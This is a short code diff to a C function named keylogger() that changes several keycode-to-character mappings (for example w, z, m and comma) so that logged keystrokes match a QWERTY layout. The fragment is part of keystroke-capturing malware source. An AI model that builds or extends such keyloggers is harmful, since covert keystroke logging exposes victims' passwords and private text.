@@ -107,7 +107,7 @@ void keylogger()\n\
 					write(log, \"q\", 1);\n\
 					break;	\n\
 				case 17:\n\
-					write(log, \"z\", 1);\n\
+					write(log, \"w\", 1);\n\
 					break;\n\
 				case 18:\n\
 					write(log, \"e\", 1);\n\
@@ -167,7 +167,7 @@ void keylogger()\n\
 					write(log, \"l\", 1);\n\
 					break;\n\
 				case 39:\n\
-					write(log, \"m\", 1);\n\
+					write(log, \",\", 1);\n\
 					break;\n\
 				case 40:\n\
 					write(log, \"%\", 1);\n\
@@ -182,7 +182,7 @@ void keylogger()\n\
 					write(log, \"`\", 1);\n\
 					break;\n\
 				case 44:\n\
-					write(log, \"w\", 1);\n\
+					write(log, \"z\", 1);\n\
 					break;\n\
 				case 45:\n\
 					write(log, \"x\", 1);\n\
@@ -200,7 +200,7 @@ void keylogger()\n\
 					write(log, \"n\", 1);\n\
 					break;\n\
 				case 50:\n\
-					write(log, \",\", 1);\n\
+					write(log, \"m\", 1);\n\
 					break;\n\
 				case 51:\n\
 					write(log, \";\", 1);\n\
